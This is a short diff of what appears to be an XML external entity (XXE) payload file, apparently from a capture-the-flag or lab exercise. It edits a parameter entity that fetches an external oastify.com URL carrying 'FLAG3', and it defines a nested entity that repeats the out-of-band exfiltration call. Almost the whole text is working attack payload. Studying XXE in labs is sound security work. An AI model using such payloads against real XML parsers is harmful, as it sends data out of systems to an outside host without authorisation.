@@ -6,7 +6,7 @@
 %b
 %test2;
 
-<!ENTITY % exfil SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG3'>
+<!ENTITY % exfil SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG3">
 
 %exfil;
 <!ENTITY % abt "<!ENTITY &#x25; exfil SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG3'>">
